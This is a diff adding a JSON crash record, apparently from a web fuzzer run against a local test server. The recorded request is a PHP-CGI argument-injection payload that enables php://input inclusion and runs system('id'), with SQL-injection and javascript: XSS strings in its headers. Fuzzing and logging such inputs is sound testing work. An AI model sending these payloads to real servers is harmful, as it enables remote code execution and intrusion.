@@ -1,0 +1,22 @@
+{
+  "timestamp": "2025-12-29T14:40:04.427584",
+  "crash_type": "server_crash",
+  "payload": "POST /cgi-bin/php-cgi.exe?-d+allow_url_include=1+-d+auto_prepend_file=php://input\nHeaders: {'User-Agent': \"' OR '1'='1\", 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Original-Url': 'javascript:alert(1)', 'Content-Length': '22'}\nBody: <?php system('id'); ?>",
+  "payload_hash": "e08a903db5b6824a",
+  "request_method": "POST",
+  "request_path": "/cgi-bin/php-cgi.exe?-d+allow_url_include=1+-d+auto_prepend_file=php://input",
+  "request_headers": {
+    "User-Agent": "' OR '1'='1",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Original-Url": "javascript:alert(1)",
+    "Content-Length": "22"
+  },
+  "request_body": "<?php system('id'); ?>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 266
+}
